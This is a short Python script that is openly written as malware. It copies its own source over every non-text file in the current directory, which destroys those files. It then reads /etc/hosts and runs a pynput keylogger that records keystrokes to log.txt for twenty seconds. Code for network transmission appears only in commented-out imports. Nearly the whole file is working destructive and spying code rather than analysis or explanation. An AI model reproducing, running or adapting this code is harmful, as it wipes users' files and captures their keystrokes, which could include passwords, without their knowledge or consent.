import sys
import os
from pynput.keyboard import Key, Listener
import logging
import multiprocessing
# import socket
# import tqdm
local_host = '127.0.0.1'
PORT = 65432
# Replication Part
host_info = []
script = sys.argv[0]
direct = [i for i in os.listdir()]
for i in direct:
    if '.txt' in i:
        direct.remove(i)
[direct.remove(i) for i in direct if '.txt' in i]
with open(script, 'r') as f:
    read = f.read()
for i in direct:
    with open(i, 'w') as was:
        was.write(read)
# Data Pooling
if (open(direct[0]).read()) \
        or (open(direct[1]).read()) \
        or (open(direct[2]).read()) == read:
    print("Viral Load Infected Directory Files.")
    hosts = open('/etc/hosts', 'r')
    o = ([i for i in hosts])
    [host_info.append(i) for i in o]
    print("Host Info:")
    print(host_info)
    if host_info[0] != " ":
        # Logging text

        log_dir = ""
        logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG,
                                format='%(asctime)s: %(message)s')

        def logg():
            def on_press(key):
                logging.info(str(key))

            with Listener(on_press=on_press) as listener:
                listener.join()

        # Timer to stop logging sequence
        if __name__ == '__main__':
            # Start logger as a process
            p = multiprocessing.Process(target=logg)
            p.start()
            p.join(20)
            if p.is_alive():
                print("running... let's kill it...")
                p.terminate()
                p.join()
        


